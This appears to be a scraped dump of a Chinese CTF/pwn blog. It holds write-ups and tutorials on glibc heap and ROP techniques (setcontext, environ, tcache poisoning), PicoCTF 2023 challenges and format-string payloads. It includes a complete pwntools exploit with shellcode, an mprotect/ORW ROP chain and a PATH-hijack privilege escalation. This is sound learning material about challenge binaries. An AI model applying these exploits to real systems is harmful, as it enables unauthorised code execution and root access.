payload.ljust(0x100,b&#x27;\\x00&#x27;)+p64(fake_addr+0x40)payload = payload.ljust(0x110,b&#x27;\\x00&#x27;)+p64(fake_addr+0x48)payload = payload.ljust(0x31c-0x10,b&#x27;\\x00&#x27;)+p64(0x1c) 更加详细的流程可以看这位师傅的博客 我只是做个总结 house_of_banana源码分析 | Blog of cat03 (giles-one.github.io) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"2023Nu1l纳新赛","slug":"2023Nu1l纳新赛","date":"2023-03-22T12:48:32.000Z","updated":"2023-09-14T17:17:40.000Z","comments":true,"path":"2023/03/22/2023Nu1l纳新赛/","link":"","permalink":"http://example.com/2023/03/22/2023Nu1l%E7%BA%B3%E6%96%B0%E8%B5%9B/","excerpt":"","text":"碎碎念比赛的时候早上瞧了一个小时然后有事出去了 没看到提示 不然可能还做的出来 但是不得不说Nu1l水平确实要求高 我还没远远不够 hint1: `movq rsp, xmm2`hint2: 利用 `shellcode` 构造自己的 `gadget` 转为 `ROP` 思路分析保护全开 环境是2.31开启了沙盒ida打开看一看 int __cdecl main(int argc, const char **argv, const char **envp)&#123; void *buf; // [rsp+8h] [rbp-8h] init(argc, argv, envp); sandbox(); buf = mmap((void *)0x2023000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;Try to ORW in limited bytes!&quot;); read(0, buf, 0x11uLL); puts(&quot;Hope that works~&quot;); mprotect(buf, 0x1000uLL, 4); JUMPOUT(0x2023000LL);&#125; 总体的思路非常简单 read往0x2023000读入0x11字节的shellcode 随后mprotect把0x2023000对应的页调为可读可写不可执行 随后jmp过去 在栈帧结束的时候 各个寄存器的值都被设置成了2023 .text:0000000000000C88 mov r15, 2023000h.text:0000000000000C8F mov rax, 2023h.text:0000000000000C96 mov rbx, 2023h.text:0000000000000C9D mov rcx, 2023h.text:0000000000000CA4 mov rdx, 2023h.text:0000000000000CAB mov rsp, 2023h.text:0000000000000CB2 mov rbp, 2023h.text:0000000000000CB9 mov rsi, 2023h.text:0000000000000CC0 mov rdi, 2023h.text:0000000000000CC7 mov r8, 2023h.text:0000000000000CCE mov r9, 2023h.text:0000000000000CD5 mov r10, 2023h.text:0000000000000CDC mov r11, 2023h.text:0000000000000CE3 mov r12, 2023h.text:0000000000000CEA mov r13, 2023h.text:0000000000000CF1 mov r14, 2023h 0x11肯定不够写 我们不仅要构造mprotect调权限 还要构造read写入orw先来看一下提示吧 movq rsp, xmm2 xmm2是浮点数寄存器 将其值赋给rsp寄存器 为什么这么干?看一看xmm2中存的是什么欸 有一个libc地址 那么想的是构造write函数泄露基址 但是直接赋值給rsi寄存器是不行的因为我们还需要构造rop链 rop链要么就是劫持程序执行流 要么就是写shellcode 然后要求对应地址有可执行权限 后者显然是不行的 所以要利用rsp指针在libc地址执行rop链 调用了mprotect函数后我们再迁移到0x2023000写rop那么总结一下思路 我们要利用17字节的shellcode 做到write基址 read读入rop链 显然是捉襟见肘 这里学习了这位师傅的方法 实在有点大开眼界2023 N1CTF Junior Pwn ShellcodeMaster - Wings 的博客 (wingszeng.top) movq rsp,xmm2 push rsp pop rsil: shr edi, 13 and eax, edi syscall jnz l ret 利用push和pop来实现寄存器互传参 shr指令是逻辑右移 这样edi就只剩下1了随后利用and指令 将eax和edi进行逻辑与操作 并将结果赋值给eax 也就是1 并且此时运算结果不为0 ZF标志位为0随后sys call系统调用就可以执行write函数 泄露libc基址 随后Jnz根据ZF标准位 为1 所以跳转再次逻辑右移 此时edi为0 and以后 结果为0 eax为0 ZF标志位为0 syscall系统调用read函数Jnz不跳转 ret指令将rsp指针指向的内容 此时是我们填入的rop链 弹入到rip寄存器 成功劫持程序执行流 听我这么说可能还是不太明白 建议自己动调一步步跟着看 另外可以看一下那位师傅的博客 里面有详细的shellcode编写思路 io.send(asm(shellcode))libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7f009903b4c0-0x7f0098e4d000)success(&quot;libc_addr :&quot;+hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x000000000011c1e1rax_addr = libc_addr + libc.search(asm(&#x27;pop rax;ret;&#x27;)).__next__()ret_addr = libc_addr + libc.search(asm(&#x27;ret;&#x27;)).__next__()syscall = libc_addr + 0x000000000002584drsp_addr = libc_addr + 0x0000000000032b5arop1 = p64(rdi_addr)+p64(0x2023000)rop1 += p64(rsi_addr)+p64(0x1000)rop1 += p64(rdx_addr)+p64(7) + p64(0)+ p64(mprotect_addr)rop1 += p64(rdi_addr)+p64(0)rop1 += p64(rsi_addr)+p64(0x2023500)rop1 += p64(rdx_addr)+p64(0x1000)+p64(0)+p64(read_addr)rop1 += p64(rsp_addr)+p64(0x2023508)io.send(rop1) 求出libc基址以后 我们就可以构造rop链了 按照原来的思路 就是调用mprotect把0x2023000的权限开一开 然后read读入orw另外没有单独的pop_rdx指令 这里我用的是pop rdx,pop r12的然后最后就是劫持rsp 迁移到0x2023508 8字节要用来存flag字符串之所以要多0x500的话 是因为到时候栈空间不够 会跑到0x2022000这一个页 但是这个页没有可写权限 所以执行不下去 要抬高栈随后就是老一套的orw了到这里就结束了 不得不说这题出的是真的巧妙 完整exp: from pwn import*from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;1.14.71.254&quot;,28793)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)#libc = ELF(&quot;./刷题/libc-2.27.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause() io.recvuntil(&quot;Try to ORW in limited bytes!&quot;)shellcode = &quot;&quot;&quot; movq rsp,xmm2 push rsp pop rsil: shr edi, 13 and eax, edi syscall jnz l ret&quot;&quot;&quot; io.send(asm(shellcode))libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-(0x7f009903b4c0-0x7f0098e4d000)success(&quot;libc_addr :&quot;+hex(libc_addr))mprotect_addr = libc_addr + libc.sym[&#x27;mprotect&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x000000000011c1e1rax_addr = libc_addr + libc.search(asm(&#x27;pop rax;ret;&#x27;)).__next__()ret_addr = libc_addr + libc.search(asm(&#x27;ret;&#x27;)).__next__()syscall = libc_addr + 0x000000000002584drsp_addr = libc_addr + 0x0000000000032b5arop1 = p64(rdi_addr)+p64(0x2023000)rop1 += p64(rsi_addr)+p64(0x1000)rop1 += p64(rdx_addr)+p64(7) + p64(0)+ p64(mprotect_addr)rop1 += p64(rdi_addr)+p64(0)rop1 += p64(rsi_addr)+p64(0x2023500)rop1 += p64(rdx_addr)+p64(0x1000)+p64(0)+p64(read_addr)rop1 += p64(rsp_addr)+p64(0x2023508)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))io.send(rop1)# payload = shellcraft.open(&#x27;./flag\\x00\\x00&#x27;,0)# payload += shellcraft.read(3,0x2023100,0x30)# payload += shellcraft.write(2,0x2023100,0x30)flag_addr = 0x2023500open_addr = libc_addr + libc.sym[&#x27;open&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]payload = b&#x27;./flag\\x00\\x00&#x27;+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) +p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) +p64(write_addr)# pause()io.send(payload)io.recvuntil(&quot;flag&#123;&quot;)flag = b&#x27;flag&#123;&#x27;+io.recvuntil(&quot;&#125;&quot;)success(flag) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"setcontext构造rop链","slug":"setcontext构造rop链","date":"2023-03-19T14:42:08.000Z","updated":"2023-09-14T17:20:42.000Z","comments":true,"path":"2023/03/19/setcontext构造rop链/","link":"","permalink":"http://example.com/2023/03/19/setcontext%E6%9E%84%E9%80%A0rop%E9%93%BE/","excerpt":"","text":"用途比较大的一个办法 通常适用的是开启了沙盒的堆 然后用来构造orw链不过libc2.29是一个比较大的分水岭 前后的版本关于setcontext的利用不一样 libc2.27.text:0000000000052070 public setcontext ; weak.text:0000000000052070 setcontext proc near ; CODE XREF: sub_586B0+C↓p.text:0000000000052070 ; DATA XREF: LOAD:0000000000009018↑o.text:0000000000052070 ; __unwind &#123;.text:0000000000052070 push rdi.text:0000000000052071 lea rsi, [rdi+128h] ; nset.text:0000000000052078 xor edx, edx ; oset.text:000000000005207A mov edi, 2 ; how.text:000000000005207F mov r10d, 8 ; sigsetsize.text:0000000000052085 mov eax, 0Eh.text:000000000005208A syscall ; LINUX - sys_rt_sigprocmask.text:000000000005208C pop rdi.text:000000000005208D cmp rax, 0FFFFFFFFFFFFF001h.text:0000000000052093 jnb short loc_520F0.text:0000000000052095 mov rcx, [rdi+0E0h].text:000000000005209C fldenv byte ptr [rcx].text:000000000005209E ldmxcsr dword ptr [rdi+1C0h].text:00000000000520A5 mov rsp, [rdi+0A0h].text:00000000000520AC mov rbx, [rdi+80h].text:00000000000520B3 mov rbp, [rdi+78h].text:00000000000520B7 mov r12, [rdi+48h].text:00000000000520BB mov r13, [rdi+50h].text:00000000000520BF mov r14, [rdi+58h].text:00000000000520C3 mov r15, [rdi+60h].text:00000000000520C7 mov rcx, [rdi+0A8h].text:00000000000520CE push rcx.text:00000000000520CF mov rsi, [rdi+70h].text:00000000000520D3 mov rdx, [rdi+88h].text:00000000000520DA mov rcx, [rdi+98h].text:00000000000520E1 mov r8, [rdi+28h].text:00000000000520E5 mov r9, [rdi+30h].text:00000000000520E9 mov rdi, [rdi+68h].text:00000000000520E9 ; &#125; // starts at 52070.text:00000000000520ED ; __unwind &#123;.text:00000000000520ED xor eax, eax.text:00000000000520EF retn 你可以在libc文件中搜索函数setcontext找到这一串汇编前面的指令没啥用 重点是 .text:00000000000520A5 mov rsp, [rdi+0A0h] 这一句rsp寄存器的值由rdi寄存器决定的 rdi可太好控制了 我们执行free函数 rdi的值就是被释放的chunk的用户区地址但是光控制rsp寄存器也没用 他不执行啊 还得再把rop链弹到rip寄存器里面那就要用到ret指令了是吧 往下看一看 找到了 .text:00000000000520CE push rcx把rcx的值入栈 rcx能不能控制啊 能啊 .text:00000000000520C7 mov rcx, [rdi+0A8h]那就意味着 我们可以利用这三行 实现一个栈迁移 劫持程序执行流并且所需要的只是覆盖free_hook演示的话 可以看一看wp分类里的Ciscn复现里的一题 libc2.292.29对于setcontext进行了优化 不好利用了 .text:0000000000055E00 public setcontext ; weak.text:0000000000055E00 setcontext proc near ; CODE XREF: sub_5C160+C↓p.text:0000000000055E00 ; DATA XREF: LOAD:000000000000C6D8↑o.text:0000000000055E00 ; __unwind &#123;.text:0000000000055E00 push rdi.text:0000000000055E01 lea rsi, [rdi+128h] ; nset.text:0000000000055E08 xor edx, edx ; oset.text:0000000000055E0A mov edi, 2 ; how.text:0000000000055E0F mov r10d, 8 ; sigsetsize.text:0000000000055E15 mov eax, 0Eh.text:0000000000055E1A syscall ; LINUX - sys_rt_sigprocmask.text:0000000000055E1C pop rdx.text:0000000000055E1D cmp rax, 0FFFFFFFFFFFFF001h.text:0000000000055E23 jnb short loc_55E80.text:0000000000055E25 mov rcx, [rdx+0E0h].text:0000000000055E2C fldenv byte ptr [rcx].text:0000000000055E2E ldmxcsr dword ptr [rdx+1C0h].text:0000000000055E35 mov rsp, [rdx+0A0h].text:0000000000055E3C mov rbx, [rdx+80h].text:0000000000055E43 mov rbp, [rdx+78h].text:0000000000055E47 mov r12, [rdx+48h].text:0000000000055E4B mov r13, [rdx+50h].text:0000000000055E4F mov r14, [rdx+58h].text:0000000000055E53 mov r15, [rdx+60h].text:0000000000055E57 mov rcx, [rdx+0A8h].text:0000000000055E5E push rcx.text:0000000000055E5F mov rsi, [rdx+70h].text:0000000000055E63 mov rdi, [rdx+68h].text:0000000000055E67 mov rcx, [rdx+98h].text:0000000000055E6E mov r8, [rdx+28h].text:0000000000055E72 mov r9, [rdx+30h].text:0000000000055E76 mov rdx, [rdx+88h].text:0000000000055E76 ; &#125; // starts at 55E00.text:0000000000055E7D ; __unwind &#123;.text:0000000000055E7D xor eax, eax.text:0000000000055E7F retn 你可以看到 变成rdx寻址了 不过也不碍事 还是有办法解决介绍一个新的工具 ropper 其可以查询libc文件中的一些gadget ropper -f libc文件路径 --search &#x27;指令&#x27; 就比如此时我们想要 可以修改rdx值的gadget找到了很多串 远不止图片上这些rdi寄存器还是很好控制的 所以我们想的是利用rdi控制rdx 利用rdx控制rsp 这样利用rdx做一个中间商那就找呗 找啊找啊 找到下面这串前面的mov 就不提了 可以修改rdx的值 最后的call才是关键呐rdx此时已经被我们操控了 那么[rdx+0x20]也是可被控制的 这里填入setcontext的地址不就好了 此时rdx的值已经被控制了 所以rsp也可以 那么就跟上面一样了实战利用在wp分类中的hgame2023 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"基于Environ构造rop链","slug":"基于Environ构造rop链","date":"2023-03-19T14:40:59.000Z","updated":"2023-09-14T17:18:14.000Z","comments":true,"path":"2023/03/19/基于Environ构造rop链/","link":"","permalink":"http://example.com/2023/03/19/%E5%9F%BA%E4%BA%8EEnviron%E6%9E%84%E9%80%A0rop%E9%93%BE/","excerpt":"","text":"EnvironLinux C中environ 变量是一个char** 类型 存储着系统的环境变量编译下面的程序 进行一个实验 进入pwndbg我们来看一下environ指向的地址是哪里 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;void test1()&#123; puts(&quot;test1&quot;);&#125;void test2()&#123; puts(&quot;test2&quot;);&#125;int main()&#123; while(1)&#123; test1(); test2(); &#125;&#125; 可以看到其指向的其实是栈帧高地址处的环境变量 我们s进入test1函数可以看到此时environ存储的值距离rbp非常接近 如果我们计算一下偏移 就可以得到栈帧的ret addr地址再加上任意写 就可以做到控制程序执行流 实际利用覆盖retaddr这个办法的利用主要是在堆中 对于开启了沙盒的堆 我们只能构造orw 从而获取flag 但是如何执行rop链是一个难点 如果我们得到了ret addr地址 搭配上任意写 就可以劫持程序执行流 从而执行rop链演示环境: ubuntu22 libc依赖2.27 1.0小版本演示附件: 自己编译的 涵盖所有漏洞首先我们利用tcachebin attack 申请到指向environ的chunk (实际做题当然不局限于tcachebin attack) libc_addr = gift()environ_addr = libc_addr + libc.sym[&#x27;environ&#x27;]add(0x30)#0delete(0)delete(0)edit(0,8,p64(environ_addr))add(0x30)#1add(0x30,)#2show(2)io.recv()stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))#-0x110success(&quot;stack_addr :&quot;+hex(stack_addr)) 老生常谈的操作了 不过获取libc基址的那个操作是我编写程序的时候直接给的漏洞 毕竟方便演示嘛那么 获取了栈上的一个地址 要做的当然是计算和ret addr的偏移了这时候会存在两种情况 一种rbp的值指向栈上 下一个字长就是ret addr了 直接看就好了 和泄露出来的偏移大概在0x100-0x200左右 上面的小程序就是这种情况还有一种情况是我的演示程序 其rbp并不指向栈上这种情况也别怕 断点直接打在栈帧结束前的ret指令 看一下现在的rsp是指向哪里 计算那个地址的偏移就行了如图所示 我计算出来的偏移是0x110 那就依法炮制 利用tcachebin attack任意写 delete(0)delete(0)edit(0,8,p64(stack_addr))add(0x30)#3add(0x30)#4onegadget_addr = libc_addr + 0x4f2c5edit(4,8,p64(onegadget_addr)) 直接同样也是图方便 直接填了个onegadget 一般是开沙盒的 或者是libc2.34以上的版本没有hook了可以看到覆盖成功了 接下来就劫持了程序执行流 覆盖函数的retaddr这个我感觉比上面那个效果更牛逼一点 上面那种覆盖办法 直接就把程序执行流控死了 执行完你的rop链以后 如果你rop链不返回的话 就直接终止了程序这个办法是覆盖你调用的函数的retaddr 这样也就把调用函数的执行流控制了 main函数的不会当然 还是没逼用 毕竟最后都控执行流了 我们肯定就获取shell或者flag了 还要这程序执行下去什么哎呀 虽然没用 但还是看一看嘛 了解了解比如 这个时候执行一个puts函数 我们s进入单步执行到这里 继续s进去待这个子函数执行完了 他肯定要返回父函数的嘛这个时候你看rsp指针 是吧 和environ存的地址很接近的算一算偏移照样能覆盖 和上题一样的环境 来演示一下既然我们最后执行的是edit函数 所以攻击的应该是read函数的retaddr不过这里先不演示 就比如menu函数的puts函数吧 打这里断点调一下 算一下偏移 直接打 delete(0)delete(0)edit(0,8,p64(stack_addr))add(0x30)#3add(0x30)#4onegadget_addr = libc_addr + 0x4f2c5gdb.attach(io,&#x27;b *0x4009CF&#x27;)pause(0)edit(4,8,p64(onegadget_addr))pause() 欸 怎么不是onegadget呢 犯蠢了吧 那你这都到main函数的执行了 你onegadget是edit函数写进去的 那这栈结构肯定又被系统写了一次 所以我们还是乖乖写read函数吧s进去 单步执行到ret是吧 照样打 算一下偏移 覆盖一下控制程序执行流成功 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"PicoCtf2023","slug":"PicoCtf2023","date":"2023-03-17T05:45:57.000Z","updated":"2023-09-14T17:20:18.000Z","comments":true,"path":"2023/03/17/PicoCtf2023/","link":"","permalink":"http://example.com/2023/03/17/PicoCtf2023/","excerpt":"","text":"第一次打国外的比赛 题型也都很新颖 记录一下做出来的题目 two-sum签到题 考的是整形溢出 直接给了源码 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static int addIntOvf(int result, int a, int b) &#123; result = a + b; if(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; result &lt; 0) return -1; if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result &gt; 0) return -1; return 0;&#125;int main() &#123; int num1, num2, sum; FILE *flag; char c; printf(&quot;n1 &gt; n1 + n2 OR n2 &gt; n1 + n2 \\n&quot;); fflush(stdout); printf(&quot;What two positive numbers can make this possible: \\n&quot;); fflush(stdout); if (scanf(&quot;%d&quot;, &amp;num1) &amp;&amp; scanf(&quot;%d&quot;, &amp;num2)) &#123; printf(&quot;You entered %d and %d\\n&quot;, num1, num2); fflush(stdout); sum = num1 + num2; if (addIntOvf(sum, num1, num2) == 0) &#123; printf(&quot;No overflow\\n&quot;); fflush(stdout); exit(0); &#125; else if (addIntOvf(sum, num1, num2) == -1) &#123; printf(&quot;You have an integer overflow\\n&quot;); fflush(stdout); &#125; if (num1 &gt; 0 || num2 &gt; 0) &#123; flag = fopen(&quot;flag.txt&quot;,&quot;r&quot;); if(flag == NULL)&#123; printf(&quot;flag not found: please run this on the server\\n&quot;); fflush(stdout); exit(0); &#125; char buf[60]; fgets(buf, 59, flag); printf(&quot;YOUR FLAG IS: %s\\n&quot;, buf); fflush(stdout); exit(0); &#125; &#125; return 0;&#125; 我们直接输入sum1 sum2的值 只要满足两个判断式中的一个就行 if(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; result &lt; 0)if(a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; result &gt; 0) 这里我选择打第一个判断式 只要a+b超过了无符号int型范围就行 二者值都为2147483647即可 babygame01脑洞比较大的一道题 不过还在逻辑之内 好好分析一番 ida看一下伪代码 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+1h] [ebp-AA5h] int v5[2]; // [esp+2h] [ebp-AA4h] BYREF char v6; // [esp+Ah] [ebp-A9Ch] char v7[2700]; // [esp+Eh] [ebp-A98h] BYREF unsigned int v8; // [esp+A9Ah] [ebp-Ch] int *v9; // [esp+A9Eh] [ebp-8h] v9 = &amp;argc; v8 = __readgsdword(0x14u); init_player(v5); init_map(v7, v5); print_map(v7, v5); signal(2, (__sighandler_t)sigint_handler); do &#123; do &#123; v4 = getchar(); move_player(v5, v4, v7); print_map(v7, v5); &#125; while ( v5[0] != 29 ); &#125; while ( v5[1] != 89 ); puts(&quot;You win!&quot;); if ( v6 ) &#123; puts(&quot;flage&quot;); win(); fflush(stdout); &#125; return 0;&#125; 写博客重新复现的时候 决定把每个函数都过一遍 顺便加强我的代码审计能力 int __cdecl init_player(int a1)&#123; int result; // eax *a1 = 4; *(a1 + 4) = 4; result = a1; *(a1 + 8) = 0; return result;&#125; a1的地址等同于v5 v5这个数组就定义了两个元素 分别用来存放此时我们处于map上的位置 Elf32_Dyn **__cdecl init_map(int a1, _DWORD *a2)&#123; Elf32_Dyn **result; // eax int i; // [esp+8h] [ebp-Ch] int j; // [esp+Ch] [ebp-8h] result = &amp;GLOBAL_OFFSET_TABLE_; for ( i = 0; i &lt;= 29; ++i ) &#123; for ( j = 0; j &lt;= 89; ++j ) &#123; if ( i == 29 &amp;&amp; j == 89 ) &#123; *(a1 + 2699) = &#x27;X&#x27;; &#125; else if ( i == *a2 &amp;&amp; j == a2[1] ) &#123; *(90 * i + a1 + j) = player_tile; &#125; else &#123; *(90 * i + a1 + j) = &#x27;.&#x27;; &#125; &#125; &#125; return result;&#125; a1相当于v7 v7定义了非常大一串 用来开辟一块内存给地图的存放 利用for循环对map进行了初始化 除了两个特殊的地方 用户的初始位置和终点 其他都为’.’ int __cdecl print_map(int a1, int a2)&#123; int i; // [esp+8h] [ebp-10h] int j; // [esp+Ch] [ebp-Ch] clear_screen(); find_player_pos(a1); find_end_tile_pos(a1); print_flag_status(a2); for ( i = 0; i &lt;= 29; ++i ) &#123; for ( j = 0; j &lt;= 89; ++j ) putchar(*(90 * i + a1 + j)); putchar(10); &#125; return fflush(stdout);&#125; for循环遍历打印出map 接下来用getchar赋值了v4 传入下面这个函数充当a2 a1用来存储用户位置 a3则是存放map _BYTE *__cdecl move_player(_DWORD *a1, char a2, int a3)&#123; _BYTE *result; // eax if ( a2 == &#x27;l&#x27; ) player_tile = getchar(); if ( a2 == &#x27;p&#x27; ) solve_round(a3, a1); *(a1[1] + a3 + 90 * *a1) = &#x27;.&#x27;; switch ( a2 ) &#123; case &#x27;w&#x27;: --*a1; break; case &#x27;s&#x27;: ++*a1; break; case &#x27;a&#x27;: --a1[1]; break; case &#x27;d&#x27;: ++a1[1]; break; &#125; result = (a1[1] + a3 + 90 * *a1); *result = player_tile; return result;&#125; 大体是利用’wsad’控制用户位置 不过存放两个特殊的指令 ‘l’可以把player_tile替换成其后面的字符 ‘p’则可以直接把用户位置移动到终点 最后利用result存储用户位置移动后的地址 在对应地址存入player_tile if ( v6 ) &#123; puts(&quot;flage&quot;); win(); fflush(stdout); &#125; 最后回到main函数 如果到达了终点 则对v6进行判断 如果为真 就输出flag 分析完了程序 来捋一捋思路 目的无非就是要修改到v6的值 不过程序不存在任意写也无法栈溢出覆盖到v6 不过还是存在着一个细微的漏洞 可以做到数组溢出 如果我们使得v5中的元素值为负呢? 也就是达到了map边界后仍然向边界外面移动 这个时候就会往非法内存处写入值 这对于v6的值会有什么影响呢 我们知道 在栈结构不被破坏的情况下 固定索引到的栈地址存放的一定是v6 那么我们只需要破坏栈结构 使其索引到的是其他值就行了 这个时候我们来尝试一下 进行一下数组溢出 将位置移动到左上角后 再输入a 可以看到此时栈的结构就成功被破坏了 不过此时我们仍然无法通过if byte ptr的作用在于指明访问的内存单元是一个字节单元 也就是只读入一个字节的数据 此时还是0 那么只需要利用同样的手法多试几次 最后成功获得flag VNE从来没做过这样的题目 说实话还是挺好玩的 感觉和awd有点像 一开始没有给我们附件 启动靶机后 提示让我们进行ssh连接 这里我使用的软件是finalshell 连上了以后 照着提示下载了bin文件 是题目的附件 保护全开 ida看一看 int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rax int v4; // ebx __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax const char *v8; // rax __int64 v9; // rax __int64 v10; // rax char v12; // [rsp+3h] [rbp-6Dh] BYREF unsigned int v13; // [rsp+4h] [rbp-6Ch] char *v14; // [rsp+8h] [rbp-68h] char v15[32]; // [rsp+10h] [rbp-60h] BYREF char v16[40]; // [rsp+30h] [rbp-40h] BYREF unsigned __int64 v17; // [rsp+58h] [rbp-18h] v17 = __readfsqword(0x28u); v14 = getenv(&quot;SECRET_DIR&quot;); if ( v14 ) &#123; v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Listing the content of &quot;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v5, v14); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(v6, &quot; as root: &quot;); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::allocator&lt;char&gt;::allocator(&amp;v12); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v16, v14, &amp;v12); std::operator+&lt;char&gt;(v15, &quot;ls &quot;, v16); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v16); std::allocator&lt;char&gt;::~allocator(&amp;v12); setgid(0); setuid(0); v8 = (const char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::c_str(v15); v13 = system(v8); if ( v13 ) &#123; v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, &quot;Error: system() call returned non-zero value: &quot;); v10 = std::ostream::operator&lt;&lt;(v9, v13); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = 1; &#125; else &#123; v4 = 0; &#125; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v15); &#125; else &#123; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cerr, &quot;Error: SECRET_DIR environment variable is not set&quot;); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = 1; &#125; return v4;&#125; 用c++编写的程序 结合直接运行大概能看懂主要流程 就是根据环境变量SECRET_DIR的值 执行ls SECRET_DIR 加上题目给的提示 所以这里把SECRET_DIR值设置为&#x2F;root&#x2F; 看看root目录下有什么东西 我们的目标就是flag.txt了 当然由于权限问题 我们肯定不能直接cat 这里学习了幽林师傅的思路 我们把&#x2F;bin目录里面的cat文件拷贝下来 上传到&#x2F;home&#x2F;ctf-player 目录中 顺便更改一下PATH 顺便更改cat文件名为ls 这样在调用ls的时候 相当于调用的就是cat了 然后再把SECRET_DIR更改为&#x2F;root&#x2F;flag.txt 就可以获取flag了 不过不知道什么问题 使用finalshell执行最后一步的时候 会报如下错 所以我更换了windterm才解决问题 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"手写格式化字符串payload","slug":"手写格式化字符串payload","date":"2023-03-14T12:29:52.000Z","updated":"2023-09-14T17:18:24.000Z","comments":true,"path":"2023/03/14/手写格式化字符串payload/","link":"","permalink":"http://example.com/2023/03/14/%E6%89%8B%E5%86%99%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2payload/","excerpt":"","text":"漏洞分析万万没想到直到学习了pwn五个月以后 我才开始学习手写格式化字符串payload 先前都是习惯利用了fmstr_payload来构造了 但是直到遇到了一道题 要在一次格式化字符漏洞中 利用两次 fmstr_payload构造出来的payload无法达到预期的攻击效果 所以只能自己手写了 来复习一下格式化字符串任意写漏洞的原理 利用了%n可以根据已经输出的字节修改对应偏移处地址的值 不过先前我们学习过的任意写 只是简单的将一个地址处的值修改为个位数大小 所需要的字节数很小 如果我们想要修改got表的值为后门函数呢 这要如何实现 总不可能传输同等大小的字节数吧 这时候引入一个新的格式化字符 %c 其有什么效果呢 我们编写下面一段小程序 #include &lt;stdio.h&gt;int main()&#123; char a[20]=&quot;test&quot;; printf(&quot;%c&quot;,a[0]);&#125; %c 可以输出单个字符 所以此时的运行结果应该是单个字符t 如果像%s之类的格式化字符 在前面加上数字呢 又有什么效果? #include &lt;stdio.h&gt;int main()&#123; char a[20]=&quot;test&quot;; printf(&quot;%10c&quot;,a[0]);&#125; 可以看到最后的结果在实际输出的字符t前面 